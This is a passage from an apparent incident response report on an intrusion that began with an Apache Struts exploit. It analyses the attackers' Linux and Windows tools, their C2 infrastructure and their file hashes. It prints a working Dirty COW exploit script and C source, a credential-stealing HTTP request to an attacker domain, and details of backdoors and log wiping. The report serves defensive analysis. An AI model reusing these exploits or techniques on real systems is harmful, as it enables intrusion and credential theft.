MIMIKATZ, a Windows version of the previously mentioned PSCAN\nscanner, and the PuTTY Secure Copy tool called PSCP.\n\n_Figure 9: Windows Toolset Download of WGET, TINYP, INFOS, CCS, MIMIKATZ,_\n\n_PSCP and PSCAN_\n\nDuring this time, it becomes quickly apparent that the attackers are targeting\ncritical financial data, based on commands, string searches and lateral\nmovement decisions conducted by the attackers. This continues until D+43/\nD+44, at which time a coordinated expulsion event took place and post-\nremediation activities began.\n\n**3.2 DETECTION AND RESPONSE**\nThe client contacted RSA IR when system administrators observed anomalies\nassociated with the ‘root’ user on system ALPHA during remediation. These\nanomalies were brought to the attention of client security personnel. The\n**CVE-2017-5638 vulnerability present on system ALPHA was identified 25**\ndays (D+25) after the initial compromise when hundreds of thousands of\nsuccessful vulnerability scanning and exploit sessions against the system were\nobserved. The vulnerability was determined to have been introduced by an\nout-of-band source installation of an affected version of Apache Struts, which\nhad been installed by the web developers. While the organization had taken\nthe necessary steps to remediate and patch all systems reported vulnerable to\n**CVE-2017-5638, the vulnerable web page on system ALPHA was not detected**\ndue to the web server and operating system reporting that the affected\npackage was not installed. Based on the extensive number of successful exploit\nattempts that ranged from the return of a pre-defined character string to\nsuccessful downloading and execution of malicious code, system ALPHA was\nremoved from service, a forensic image was obtained for in-depth analysis\n\n14\n\n\n-----\n\navailable to RSA IR upon engagement of services, with RSA IR beginning threat\nhunting actions and follow-on investigations on D+35.\n\nDuring threat hunting operations conducted in concert with client analysts,\nRSA IR identified increasingly suspect outbound binary and administrative\nnetwork communication being conducted with external internet hosts.\nSpecifically, RSA IR observed the GOTROJ traffic communicating outbound to\n**IP 107.181.246.146, and client analysts observed the PSEXESVC.exe service**\nbinary present and executing on system DELTA. Both of these initial findings\nare shown in Figure 10 and Figure 11, respectively.\n\n_Figure 10: Initial Finding of GOTROJ Communications with Suspect Meta_\n\n_Figure 11: Initial Finding of TINYP Lateral Movement_\n\nCorrelation of these suspect security events was declared an incident on\nD+35, with RSA IR being immediately engaged for incident response services.\nAt this point in the intrusion, the attackers had just entered Stage 5, as\ndescribed in Section 3.1.5.\n\nUtilizing RSA NetWitness Logs and Packets for network visibility, RSA IR\nidentified all network communication channels utilized by the attackers for\nthe duration of the incident. This assisted greatly in conducting root cause\nanalysis and intrusion scoping, as a significant amount of host forensic\n\n15 artifacts had been destroyed bypassed or made unusable by the attackers\n\n\n-----\n\nAdditionally, the use of this level of visibility allowed RSA IR to conduct\nnetwork protocol analysis on the command and control (C2) communication\npayloads, which led to the capability to decrypt attacker C2 communications\nwithin minutes of their occurrence. This level of visibility into attacker activity\ngreatly assisted in containment, eradication and remediation efforts, which\nconcluded on D+44. Upon conclusion of the incident, RSA IR determined that\nthe attackers had accessed 154 systems, the majority of which were accessed\nlaterally via ingress channels established on systems ALPHA, BRAVO,\n**CHARLIE and DELTA. Follow-on analysis of acquired host, network and disk**\nforensic data occurred in parallel with continuous monitoring and Threat\nHunting operations until incident closure on D+74.\n\nUtilizing RSA NetWitness Endpoint for host visibility, RSA IR was able to\nobserve and track specific behavioral indicators of compromise (IOCs)\nidentifying attacker activity within the environment. As the attackers were\nparticularly careful to remove all traces of their activity upon completion\nand ensure their tools were on disk while in use, many traditional artifacts or\nlog-based incident response and forensics methodologies would have been\nineffective in identifying, investigating and responding to these attackers’\nmethods. However, utilizing RSA NetWitness Endpoint in concert with RSA\nNetWitness Logs and Packets allowed RSA IR to use the attackers’ methods\nas IOCs, such as specific file download methods with subsequent deletions,\nspecific command-line arguments used by the attackers for lateral movement,\nand specific Windows user status command executions.\n\n16\n\n\n-----\n\n##### 4. INTRUSION DETAILS\n**4.1 INITIAL COMPROMISE: APACHE STRUTS2**\nIn late March of 2017, in the midst of several hundred thousand external\nvulnerability scanning attempts, an attacker using the IP address of\n**185.117.88.97 executed an HTTP request against system ALPHA and**\nexploited the Apache Struts Content-Type remote command execution\nvulnerability, CVE-2017-5638, in order to download and execute a Perl script\nnamed “b” from the IP address 95.215.45.116. Due to retention at the time\nof analysis, neither the Perl script nor the complete command used to initiate\nthe download was obtained. Actions during this time were observed by\nnetwork metadata creation.\n\nAlmost six minutes later, system ALPHA began communicating with IP\naddress 95.216.45.116 via IRC over TCP port 80. This was the initial method\nof direct system communication utilized by the actors, in which they began\nimmediate attempts to escalate privilege to the root user.\n\n**4.2 LINUX COMPROMISE AND MALICIOUS FILES**\n**4.2.1 ‘Dirty COW’ Driver Script and Kre80r Proof of Concept Code**\n\nSince the privilege-separation account for the web application server\nwas not sufficient for follow-on actions, the attackers downloaded a shell\nscript named “1.sh” that exploited the “Dirty COW” Linux Kernel Privilege\nEscalation vulnerability, CVE-2016-5165, from IP address 185.61.148.145.\nThe other downloaded file was a modified version of the PTRACE_POKEDATA\nvariant of CVE-2016-5195 POC code written by GitHub user “KrE80r.”\n. The contents of both files are shown in Figure 12 and Figure 13, with the\ndetection of this activity shown in RSA NetWitness Suite in Figure 14.\n\n#!/bin/bash\n/bin/cp /bin/bash /tmp/sbash\n/bin/chmod 4755 /tmp/sbash\nEOF\nchmod +x /tmp/x\n./cow &\necho ‘trying...’\nsleep 2\nwhile true\ndo\necho > /dev/tcp/0/22\nif [ -f “/tmp/sbash” ]\nthen killall -9 cow\nrm -f /tmp/x cow cow.c\n/tmp/sbash -p -c ‘rm -f /usr/sbin/sshd; cp /tmp/sshd.bak /usr/sbin/\nsshd;chown   0:0 /usr/sbin/sshd;chmod +x /usr/sbin/sshd;id’\n\n17\n\n\n-----\n\n/tmp/sbash -p\nexit\nelse\n#    echo ‘trying...’\nkillall -9 cow\n./cow &\nsleep 0.2\nfi\ndone\n\n_Figure 12: Contents of ‘1.sh’ Dirty COW Shell Script_\n\n#include <fcntl.h>\n#include <pthread.h>\n#include <sys/mman.h>\n#include <sys/stat.h>\n#include <sys/wait.h>\n#include <sys/ptrace.h>\n#include <unistd.h>\nint f;\nvoid *map;\npid_t pid;\npthread_t pth;\nstruct stat st;\nchar suid_binary[] = “/usr/sbin/sshd”;\nunsigned char shell_code[] = “#!/tmp/x\\n”;\nunsigned int sc_len = 9;\nvoid *madviseThread(void *arg) {\nint i,c=0;\nfor(i=0;i<200000;i++)\nc+=madvise(map,100,MADV_DONTNEED);\n}\nint main(int argc,char *argv[]){\nf=open(suid_binary,O_RDONLY);\nfstat(f,&st);\nmap=mmap(NULL,st.st_size+sizeof(long),PROT_READ,MAP_PRIVATE,f,0);\npid=fork();\nif(pid){\nwaitpid(pid,NULL,0);\nint i,o,c=0,l=sc_len;\nfor(i=0;i<100000;i++)\nfor(o=0;o<l;o++)\nc+=ptrace(PTRACE_POKETEXT,pid,map+o,*((long*)(shell_code+o)));\n\n18 }\n\n\n-----\n\nelse{\npthread_create(&pth,\nNULL,\nmadviseThread,\nNULL);\nptrace(PTRACE_TRACEME);\nkill(getpid(),SIGSTOP);\npthread_join(pth,NULL);\n}\nreturn 0;\n}\n\n_Figure 13: Contents of ‘c0w’ Dirty COW Source Code_\n\n_Figure 14: Observed Download of 1.sh and c0w from IP 185.61.148.145_\n\nBoth files were obtained via the legitimate WGET utility already present\non the system. This would continue to be the attackers’ primary method of\nacquiring tools throughout this engagement. As such, the direct-to-IP address\nacquisition of tools before execution became an effective actionable IOC to\ntrack the adversary throughout this engagement. An example of this activity\nas seen in RSA NetWitness Logs and Packets is shown in Figure 15.\n\n_Figure 15: WGET Download of SSHDoor Binary ssh_\n\n19\n\n\n-----\n\n**4.2.2 SSHDoor Client and Server**\nShortly after successfully executing the downloaded privilege escalation\ncode, the attackers again utilized WGET to download three additional\nbinaries from IP address 95.215.46.116 named ssh, sshd and auditd. The ssh\nbinary was a trojanized version of the OpenSSH 5.3p1 client binary, with the\n_sshd binary a trojanized version of the server binary. These backdoors are_\nvariants of the SSHDOOR Trojan that was observed and reported in 2013.[15]\nWhile the previously observed SSHDOOR used an XOR scheme to store an\nSSH pre-shared key and its HTTP Request Format Strings, this version used\nRC4 encryption to store the same information. The decrypted SSH pre-shared\nkey and HTTP Format Strings are shown in Figure 16.\n\n_Figure 16: RC4 Decrypted authorized_keys Entry and HTTP Format Strings_\n\nAs was the case with the previous version of SSHDOOR, upon successful\nauthentication using the client or server binary, the authenticated credentials\nare sent to the attacker via HTTP GET Request. In the case of these binaries,\nthe source host’s MAC address would be normalized to lowercase and\nincluded in the first key-value pair of the URI, with the username, password\nand destination hostname and IP address encoded into a Base64 string and\nplaced in the second key-value pair of the URI. These HTTP requests would\n\n[15 Duquette; “Linux/SSHDoor.A Backdoored SSH daemon that steals passwords”; https://](https://www.welivesecurity.com/2013/01/24/linux-sshdoor-a-backdoored-ssh-daemon-that-steals-passwords/)\n[www.welivesecurity.com/2013/01/24/linux-sshdoor-a-backdoored-ssh-daemon-that-](https://www.welivesecurity.com/2013/01/24/linux-sshdoor-a-backdoored-ssh-daemon-that-steals-passwords/)\n\n20\n\n\n-----\n\nbe sent to the C2 domains of centos-repo.org or slpar.org, depending on the\nversion of the binary executed. An example of this is shown in Figure 17.\n\nGET\n/?cid=000c29450e28&text=cm9vdCAtPiBUaGlzSXNZb3VyUGFzc3dvcm\nQ6cm9vdEAxOTIuMTY4LjE2My4xODUK HTTP/1.0\nHost: centos-repo.org\nRed text = MAC address of affected system (lowercase normalized)\nBlue text = Base64 Username:Password representation.\nDecoded Base64 String:\nroot -> ThisIsYourPassword:root@192.168.163.185\n\n_Figure 17: Credential Harvesting HTTP Request_\n\nAdditionally, both versions of SSHDOOR allow unauthorized access when\nauthenticated with the decrypted SSH pre-shared key. These trojanized binaries\nallowed the attackers to gain additional credentials that would assist them in\nmoving laterally into the internal server environment. The authorized_hosts\nentry the attackers utilized with the SSHDOOR binary is shown in Figure 18.\n\nssh-rsa\nAAAAB3NzaC1yc2EAAAADAQABAAABAQDAkqHYDX7rAoj6DNKLe4e\n7a7XFrbMRErtd6y/shqDaxSMMlXAfK6P2OQE9FmPPLDWjgkDgSyOvC0g\nTyghdGYdgKMV4DnhFiMMt4atOWwI86w71q9SEVGKKGVWLhIaCn\nGpWkWQmGGGnCOHbLezhLTnv98wscNdZLVafTOM/HqWkRcpr2XTO\nPhag/6FsXQsMKnJOZqloG5MWwdaYyIXBYEGRCA103MPmimW2jq\nY91JxQ+7xEeD4XB1s9gNakHuQsDNNYY63kfiG8UAbOGQq\n88mpsB32Ofjz6qdAgYPzBZzCoMnvhtDSTyKPYjoeDEHXMWZU\n/3PZbjuejbM8v5F9FiH4p centos-repo.org\n\n_Figure 18: Pre-Shared SSH Key Used by SSHDOOR_\n\nThe file information for the SSHDOOR client and server binaries with the C2\naddress of centos-repo.org are shown in Table 1 and Table 2, respectively.\n\nFile Name  : ssh\nFile Size    : 1,180,393 bytes\nMD5       : 0810d239169a13fc0e2e53fc72d2e5f0\nSHA1      : 60a0c1042644cdc8189af1917cb14278f64f17e8\n\n_Table 1: File Information for the SSHDOOR Client Binary (centos-repo.org)_\n\nFile Name  : sshd\nFile Size    : 1,614,981 bytes\nMD5       : d66e31794836dfd2c344d0be435c6d12\nSHA1      : a065244522b6b26c033dfbc3383b93dba776c37d\n\n21\n\n\n-----\n\nThe file information for the SSHDOOR client and server binaries with the C2\naddress of slpar.org are shown in Table 3 and Table 4, respectively.\n\nFile Name  : ssh\nFile Size    : 1,180,521 bytes\nMD5       : a365fd9076af4d841c84accd58287801\nSHA1      : ba2f90f85cada4be24d925cbff0c2efea6e7f3a8\n\n_Table 3: File Information for SSHDOOR Client Binary (slpar.org)_\n\nFile Name  : sshd\nFile Size    : 1,614,437 bytes\nMD5       : 9e2e4df27698615df92822646dc9e16b\nSHA1      : 96e56c39f38b4ef5ac4196ca12742127f286c6fa\n\n_Table 4: File Information for SSHDOOR Server Binary (slpar.org)_\n\n**4.2.3 AudiTunnel**\nThe AUDITUNNEL binary is a reverse tunneling tool similar in functionality to\nnetcat, but with support for multiple tunnels, Socks5 proxy and XOR encoded\ncommunication. It was downloaded, along with the SSHDOOR binaries from\n**95.215.46.116, under the name ‘auditd.’ Upon execution, it creates a TCP socket**\nand connects to C2 IP address 95.215.46.116 over TCP/443, creating a reverse\ntunnel to allow access to the victim server. Once the connection was made,\n**AUDITUNNEL would keep the connection alive to allow inbound or outbound**\nconnectivity through this tunnel. In order to better hide its network activity,\nthis utility would XOR all data passed through the tunnel with a key of 0x41.\nThis binary is also able to communicate via the Socks5 protocol using Basic\nauthentication. These three binaries proved to be the attackers’ primary method\nof ingress and credential harvesting for the first half of the incident. An example\nof the XOR network traffic associated with AUDITUNNEL is shown in Figure 19.\n\n22\n\n\n-----\n\nAfter the attackers observed little change to their malware C2 channels\nonce system ALPHA was remediated, the attackers quickly moved to system\n**CHARLIE, the Linux Syslog server. This allowed them a communication**\nchannel to all other systems within the Linux environment, as well as allowing\nthe attackers to control both centralized and local log entries across all Linux\nsystems accessed. At this time, the attackers moved the majority of their\ntoolset to CHARLIE, leaving only the SSHDOOR server binary on system\n**ALPHA for further credential harvesting. The Syslog server would remain one**\nof their primary staging points throughout the rest of the incident.\n\nThe file information for AUDITUNNEL is shown in Table 5.\n\nFile Name  : auditd\nFile Size    : 21,616 bytes\nMD5       : b57dc2bc16dfdb3de55923aef9a98401\nSHA1      : 1d3501b30183ba213fb4c22a00d89db6fd50cc34\n\n_Table 5: File Information for AUDITUNNEL_\n\n**4.3 LINUX SECONDARY ATTACKER TOOLS**\nThe attackers downloaded additional tools from IP address 95.215.46.116\nfor the purposes of conducting internal reconnaissance and moving laterally\nbetween the Linux and Windows environments. These tools included the\n**WINEXE version 1.1 remote command execution utility, a version of the**\n**ALW “Advanced Log Wiper” posted by “security40bscurity at 0xbscured.net”**\nposted to Pastebin on July 7, 2015, and SecPoint’s PSCAN multithreaded IP\nport scanner. With these tools, the attackers traversed the internal network\nbeginning with the shortest hop points first and migrating outward. Example\nexecutions of each of these tools are shown in Figure 20 through Figure 23.\n\n**4.3.1 Winexe**\n**WINEXE is the Windows Remote Command Execution tool for Linux. Its**\nfunctionality is very similar to that of SysInternals PSEXEC, including the\ncreation of a Windows service and file transfer of a service binary into the\nADMIN$ Windows SMB shared location (C:\\Windows). As is described in Figure\n20, the command line options are very similar to that of PSEXEC as well.\n\n23\n\n\n-----\n\n_Figure 20: Usage Message for WINEXE Binary_\n\nThe file information for WINEXE is shown in Table 6.\n\nFile Name  : winexe\nFile Size    : 8,126,714 bytes\nMD5       : edce844a219c7534e6a1e7c77c3cb020\nSHA1      : 286bf53934aa33ddf220d61c394af79221a152f1\n\n_Table 6: File Information for WINEXE_\n\n**4.3.2 ALW (Advanced Log Wiper, “l”)**\nThe ALW Advanced Log Wiper was initially downloaded to system BRAVO\nearly in the intrusion as a method of removing specific indications of\nattacker activities from Linux host logs. ALW was originally written by\n“security40bscurity” and posted to Pastebin on July 7, 2015. This binary takes\n\n24\n\n\n-----\n\nfour arguments: the user to remove from the target logs, the host to remove\nfrom the target logs, a specific terminal TTY value to remove from the target\nlogs, or a specific target log file to remove. The usage message for this binary\nis shown in Figure 21.\n\n_Figure 21: Usage Message for l Advanced Log Wiper_\n\nIf no file argument is given, ALW will remove all log entries with the specified\nuser, host or TTY from the following logs:\n\n**Logs Modified by ALW**\n\nutmp\n\nwtmp\n\nlast\n\n/var/log/secure\n\n/var/log/auth.log\n\n/var/log/messages\n\n/var/log/audit/audit.log\n\n/var/log/httpd-access.log\n\n/var/log/httpd-error.log\n\n/var/log/xferlog\n\n_Table 7: Logs Modified by ALW Log Wiper_\n\nThe file information for ALW is shown in Table 8.\n\nFile Name  : l\nFile Size    : 16,333 bytes\nMD5       : 771fa63231fb42ee97aa17818a53f432\nSHA1      : 149a9270d9160120229b7c088975c2754e3b5333\n\n_Table 8: File Information for ALW_\n\n**4.3.3 PSCAN**\nThe PSCAN binary found on host BRAVO is a TCP port scanning tool that\nattempts to create TCP socket connections to a specified port for every IP\nwithin a specified range. This functionality allows the attacker to check if\nspecific commonly used ports are open for communication in systems within\nan IP range, thereby identifying available services for internal reconnaissance.\nThe usage message for PSCAN is shown in Figure 22.\n\n25\n\n\n-----\n\n_Figure 22: Usage Message for PSCAN Port Scanning Tool_\n\nAn example execution of PSCAN is shown in Figure 23, with the file\ninformation for this binary shown in Table 9.\n\n_Figure 23: Example Usage of PSCAN Port Scanning Tool_\n\nFile Name  : pscan\nFile Size    : 10,340 bytes\nMD5       : 0f1c4a2a795fb58bd3c5724af6f1f71a\nSHA1      : 039f814cdd4ac6f675c908067d5be1d6f9acc31f\n\n_Table 9: File Information for PSCAN_\n\nTheir decisions in which systems to access indicated that their next intended\naction was to gain access to the Windows Server environment. The attackers\ncontinued to conduct internal reconnaissance within both the Linux and\nWindows environments using stolen credentials to access Linux systems via\nSSH and the WINEXE utility to access Windows systems. The actions-on-\nobjective during this time was composed of mapping the internal network\nwith the PSCAN utility and collecting host information via resident Linux and\nWindows administrative command-line utilities.\n\n**4.4 WINDOWS COMPROMISE AND MALICIOUS FILES**\n**4.4.1 GOTROJ Remote Access Trojan**\n\nOn D+30, the attackers installed a Windows Trojan, written in Go, as a\nWindows Service on one of the two primary Active Directory Domain\nControllers. They would move to utilizing the GOTROJ as their primary\nmethod of ingress for the duration of the engagement. The GOTROJ Trojan\ncommunicated with C2 IP address 107.181.246.146 over TCP/443 for its\nremote access channel. This Trojan was much more fully featured than the\n\n26\n\n\n-----\n\n|Command|Function|\n|---|---|\n|#ps|Display process listing|\n|#shell|Begin interactive command shell|\n|#kill|Remove Windows Service and Malware|\n|#info|Get system information|\n|#wget|Download function via wget HTTP|\n|#wput|Upload function via wput FTP|\n|#name|Get hostname of victim|\n|#service|Install malware as Windows Service with Service Name of ‘WindowsCtlMonitor’|\n\n\nprevious tools utilized by the attackers to this point, with eight primary\nfunctions designated by a command issued by the attackers. The commands\nand their functionality are shown in Table 10.\n\n**Command** **Function**\n\n#ps Display process listing\n\n#shell Begin interactive command shell\n\n#kill Remove Windows Service and Malware\n\n#info Get system information\n\n#wget Download function via wget HTTP\n\n#wput Upload function via wput FTP\n\n#name Get hostname of victim\n\n#service Install malware as Windows Service with\nService Name of ‘WindowsCtlMonitor’\n\n_Table 10: Decoded Commands for GOTROJ Trojan_\n\nThe commands are stored within the binary in an XOR encrypted segment,\nwhich is decrypted shortly after execution with the XOR key of ‘dmdar,’ or\n0x646D646172. The section of code which calls the c_gosh_xstr_XorCrypt()\nfunction to decrypt the commands is shown in Figure 24.\n\n_Figure 24: XOR Command Decryption Method_\n\nThis binary operates in one of two modes. The first is an ad hoc, interactive\nexecution mode, in which the malware executes within the context of a\nuser account. However, if the malware is executed as a user, there has to\n\n27\n\n\n-----\n\nbe a file named ‘xname.txt’ in that user’s temporary directory referenced by\nthe environment variable ‘%TEMP%.’ As this file was not found during this\nengagement and is not dropped by any of the tools used by the attackers, its\ncontents are not known. However, when the malware begins to communicate\nwith its C2, the contents of the file are the first thing encrypted and sent to\nthe C2 server. The second method of GOTROJ utilization is execution under a\nWindows Service as a method of persistence. The attackers used this method\nof execution during this engagement, installing the GOTROJ binary as a\nservice named WindowsCtlMonitor.\n\nThe network communication protocol this malware uses contains a very\nsimplistic, but specific, header and format. The traffic sent and received\nby this malware is XOR encrypted with an XOR key that changes for every\nmessage sent or received. An example of the format in its encrypted form is\nshown in Figure 25.\n\nBA 45 BA B2 BA BA BA 99 C9 D2 DF D6 D6 B7 B0        .E.............\nYellow = Null Bytes\nPink = ID Byte\nGreen = Length Byte\nGrey = Message\n\n_Figure 25: Annotated Encrypted Form of GOTROJ Communication_\n\nOnce decrypted with the XOR key (byte BA in the example above), the\nformatting of the message becomes considerably clearer. An illustration of\nthis is shown in Figure 26.\n\n00 FF 00 08 00 00 00 23 73 68 65 6C 6C 0D 0A   .......#shell..\nYellow = Null Bytes\nPink = ID Byte\nGreen = Length Byte\nGrey = Message\n\n_Figure 26: Annotated Decrypted Form of GOTROJ Communication_\n\nGiven this simplistic method of formatting and decryption, RSA analysts were\nable to effectively decrypt this traffic for review during the investigation,\ngreatly increasing visibility into attacker actions. However, given that this\nmalware utilizes a TCP socket connection for transport communications\nin a tunneling form, the custom communications protocol does not take\npacket boundaries into account in its design. Therefore, a single message\nmay traverse multiple packets with no additional control bytes, such as the\nID byte or length. Given this case, the method of decrypting the traffic was\nmade more effective by extracting the payload above Layer 4 and decrypting\nthat data independent of any data within Layers 2-4. The file information\n\n28\n\n\n-----\n\nfor the three versions of GOTROJ observed in this incident is shown in\nTable 11, Table 12 and Table 13. All binaries use the same C2 IP address of\n**107.181.246.146.**\n\nFile Name  : ctlmon.exe\nFile Size    : 4,392,448 bytes\nMD5       : 370d420948672e04ba8eac10bfe6fc9c\nSHA1      : 450605b6761ff8dd025978f44724b11e0c5eadcc\n\n_Table 11: File Information for GOTROJ Version 1_\n\nFile Name  : ctlmon_v2.exe\nFile Size    : 4,047,691 bytes\nMD5       : 5ddf9683692154986494ca9dd74b588f\nSHA1      : 08f527bef45cb001150ef12ad9ab91d1822bb9c7\n\n_Table 12: File Information for GOTROJ Version 2_\n\nFile Name  : ctlmon_v3.exe\nFile Size    : 4,063,744 bytes\nMD5       : f9766140642c24d422e19e9cf35f2827\nSHA1      : 7b27771de1a2540008758e9894bfe168f26bffa0\n\n_Table 13: File Information for GOTROJ Version 3_\n\n**4.4.2 AudiTunnel (Windows Version)**\nThe attackers also utilized a tunneling binary similar to the AUDITUNNEL\nbinary used on the compromised Linux systems. The svcmd.exe binary’s\nprimary purpose was to tunnel traffic to the attackers’ C2 using XOR\nencoding with a key of 0x41. This version of AUDITUNNEL is hard-coded\nto communicate with IP 185.86.151.174. The C2 IP address is clearly seen\nwithin the ASCII strings of the file, as shown in Figure 27.\n\n_Figure 27: C2 IP Address in ASCII Strings of svcmd.exe_\n\nThe IP address it communicates with is hard-coded, as is the encryption\nkey used for its communications. After establishing the TCP connection\nand socket, svcmd.exe will XOR the send and receive buffers against a value\nof 0x41. Given it connects to the C2 IP address over TCP/443, without the\nnecessary visibility, defenders might mistake it for HTTPS encrypted traffic.\nThe encryption code segment is shown in Figure 28.\n\n29\n\n\n-----\n\nThe encryption code segment is shown in Figure 28.\n\n_Figure 28: XOR Byte Encryption Loop for Send and Receive Buffer_\n\nThe file information for the Windows AUDITUNNEL binary is shown in Table 14.\n\nFile Name    : svcmd.exe\nFile Size    : 47,104 bytes\nMD5       : 8b3a91038ecb2f57de5bbd29848b6dc4\nSHA1      : 54074b3934955d4121d1a01fe2ed5493c3f7f16d\n\n_Table 14: File Information for AUDITUNNEL (Windows Version)_\n\n**4.5 WINDOWS SECONDARY ATTACKER TOOLS**\n4.5.1 TINYP\n\nWhile the WINEXE binary was used to migrate from the Linux environment\nto the Windows environment, a modified version of SysInternals PSEXEC\nwas used to move throughout the Windows environment. This modified\nPSEXEC binary, named TINYP by the attackers, was the primary lateral\nmovement mechanism. Two versions of TINYP were used during this\nintrusion (v.0.7.6.2 and v.0.7.7.4), with the attackers downloading the binaries\nunder the filenames ti1.bmp, tinyp1.bmp, tinyp2.bmp, tineyp3.bmp, tinyp4.bmp\nand ps.bmp. Once downloaded, the binary was renamed to ps.exe for use in\nlateral movement. While both versions of TINYP have all of the features of\nnormal SysInternals PSEXEC, they also include additional functionality. These\nfunctionalities are given at the command line at execution, just like PSEXEC.\nThe usage list of all of TINYP’s functions is shown in Table 15.\n\n30\n\n\n-----\n\n|Argument|Function|\n|---|---|\n|\\\\<Target Hostname or IP>|Remote system to communicate with|\n|-e|Do not load user profile on target host|\n|-copyself|Copy TINYP to C:\\Windows on target host|\n|-cleanup|Delete System Event Log|\n|-getfiles <file>|Download files from target host|\n|-copyfiles <file>|Upload files to target host $ADMIN share|\n|-d|Run command non-interactively|\n|-i <session>|Run command interactively to <session>|\n|-u <username>|Username flag|\n|-p <password>|Password flag|\n|-s|Run as SYSTEM on target host|\n|<cmd>|Command to run on the target host. Running cmd gives interactive shell|\n\n\n**Argument** **Function**\n\n\\\\<Target Hostname or IP> Remote system to communicate with\n\n-e Do not load user profile on target host\n\n-copyself Copy TINYP to C:\\Windows on target host\n\n-cleanup Delete System Event Log\n\n-getfiles <file> Download files from target host\n\n-copyfiles <file> Upload files to target host $ADMIN share\n\n-d Run command non-interactively\n\n-i <session> Run command interactively to <session>\n\n-u <username> Username flag\n\n-p <password> Password flag\n\n-s Run as SYSTEM on target host\n\n<cmd> Command to run on the target host.\nRunning cmd gives interactive shell\n\n_Table 15: TINYP Arguments and Functions_\n\nThe primary modifications made to the base SysInternals PSEXEC are the\nfunctions associated with the –copyself, –cleanup, –getfiles, and –copyfiles\narguments. The –copyself and –copyfiles arguments will copy a file to the\ntarget remote system via SMB/CIFS, with that file either being a copy\nof TINYP itself or an explicitly designated file, respectively. The –getfiles\nargument will move files in the opposite direction, downloading specified\nfiles from the target remote host to the source host via SMB/CIFS. Lastly,\nthe TINYP tool contains an argument to specifically delete entries from the\nWindows System Event Log. While this is an attempt to cover tracks as the\nattacker moves throughout the environment, it is important to note that this\nonly affects the System Event Log, leaving Application, Security and service-\nspecific Windows Event Logs to retain data useful to investigators.\n\nThe TINYP tool was used primarily with the Windows Command Processor\n_cmd.exe as the final argument for remote command shell access. Once the_\nattacker closed the remote session, the TINYP tool would:\n\n1. Check if it copied itself to the $ADMIN share of the remote system (C:\\\n\nWindows). If so, it would delete itself from that location.\n\n2. Remove the PSEXESVC Windows Service and the psexesvc.exe PSEXEC\n\nRemote Service binary from the remote system.\n\n3. Delete the System Event Log from the remote system.\n\n31\n\n\n-----\n\nEvidence of this activity, in the form of a lab execution of this tool, is shown in\nFigure 29.\n\n_Figure 29: Sample Execution of TINYP v.0.7.7.4_\n\nThe file information for TINYP versions 0.7.6.2 and 0.7.7.4 is shown in Table\n16 and Table 17, respectively.\n\nFile Name  : TINYP2.bin\nFile Size    : 277,504 bytes\nMD5       : 7393cb0f409f8f51b7745981ac30b8b6\nSHA1      : 6c17113f66efa5115111a9e67c6ddd026ba9b55d\n\n_Table 16: File Information for TINYP v.0.7.6.2_\n\nFile Name : ps.exe\nFile Size   : 234,496 bytes\nMD5       : c4d746b8e5e8e12a50a18c9d61e01864\nSHA1      : c020f8939f136b4785dda7b2e4b80ced96e23663\n\n_Table 17: File Information for TINYP v.0.7.7.4_\n\n**4.5.2 WGET (UIAUTOMATIONCORE.DLL.BIN)**\nAs done previously, the attackers used WGET version 1.11.4 to download\nbinaries before execution. However, the WGET used was renamed to\n_UIAutomationCore.dll.bin. Evidence of this is shown in execution of the binary_\nin Figure 30.\n\n32\n\n\n-----\n\n_Figure 30: WGET Renamed to UIAutomationCore.dll.bin_\n\nThis binary is observed downloading a version of the TINYP tool from IP\naddress 185.61.148.145 in the RSA NetWitness Endpoint Application\nTracking Data shown in Figure 31.\n\nECATSERVER,AGENT_HOSTNAME,2017-05-02\n12:51:43.0671260,UIAutomationCore.dll.bin,TINYP2.bmp,C:\\\nWindows\\SysWOW64\\zh-TW\\,NULL,UIAutomationCore.dll.bin\nhttp://185.61.148.145:443/TINYP2.bmp\n\n_Figure 31: Download of TINYP Binary with UIAutomationCore.dll.bin_\n\nThe file information is shown in Table 18.\n\nFile Name  : UIAutomationCore.dll.bin\nFile Size    : 401,408 bytes\nMD5       : bd126a7b59d5d1f97ba89a3e71425731\nSHA1      : 457b1cd985ed07baffd8c66ff40e9c1b6da93753\n\n_Table 18: File Information for WGET (UIAutomationCore.dll.bin)_\n\n**4.5.3 PSCP (PuTTY Secure File Copy)**\nThe PSCP tool used by the attackers was an unmodified version of PuTTY’s\nSecure File Copy v0.67. The file information is shown in Table 19.\n\nFile Name  : pscp.bin\nFile Size    : 359,336 bytes\nMD5       : b3135736bcfdab27f891dbe4009a8c80\nSHA1      : 9240e1744e7272e59e482f68a10f126fdf501be0\n\n_Table 19: File Information for PSCP_\n\n**4.5.4 Mimikatz Variant (32-bit, 64-bit)**\n\nFor credential harvesting within the Windows environment, the attackers\ndownloaded two files named image32.bmp and image64.bmp. These files\nwere subsequently renamed to xxx32.exe and xxx64.exe, respectively. In\nreviewing these files and their activity, RSA IR determined that these were\nimplementations of the sekurlsa_acquireLSA() functionality of the Mimikatz\ncredential harvesting tool. The file information is shown in Table 20 and\nTable 21.\n\n33\n\n\n-----\n\nFile Name  : xxx32.exe\nFile Size    : 528,896 bytes\nMD5       : 6499863d47b68030f0c5ffafaffb1344\nSHA1      : 2197e35f14ff9960985c982ed6d16d5bd5366062\n\n_Table 20: File Information for MIMIKATZ Variant (32-bit)_\n\nFile Name  : xxx64.exe\nFile Size    : 589,312 bytes\nMD5       : 752d245f1026482a967a763dae184569\nSHA1      : 355603b1922886044884afbdfa9c9a6626b6669a\n\n_Table 21: File Information for MIMIKATZ Variant (64-bit)_\n\n**4.5.5 CCS**\n**CCS is a system process and library identifier that, when no arguments are**\ngiven, will print the currently running processes and their process IDs to both\nSTDOUT and a file named _out.log in the current working directory. If CCS\nexecuted with the “modules” argument, it printed the running processes and\ntheir process IDs, as well as all DLLs loaded by each process. This operation\nalso prints the output to both STDOUT and the _out.log file. Additionally,\nthe _out.log file will not be replaced; rather, it will be appended with every\nsubsequent execution. The file information is shown in Table 22.\n\nFile Name  : ccs.bmp\nFile Size    : 82,944 bytes\nMD5       : d406e037f034b89c85758af1a98110be\nSHA1      : 6bc46528da6cd224fa5e58ccd9df5b05c46c673d\n\n_Table 22: File Information for CCS_\n\n**4.5.6 Infos.bmp**\nThe INFOS tool was a host reconnaissance tool obtaining browser history,\nbrowser login data and RDP logs from the system, and it outputs them to\nSTDOUT. The attackers used this tool to harvest credentials, identify internal\nweb applications and observe the common RDP connections and accounts\nused on the Windows servers. The file information is shown in Table 23.\n\nFile Name  : infos.bmp\nFile Size    : 494,080 bytes\nMD5       : ab8bed25f9ff64a4b07be5d3bc34f26b\nSHA1      : 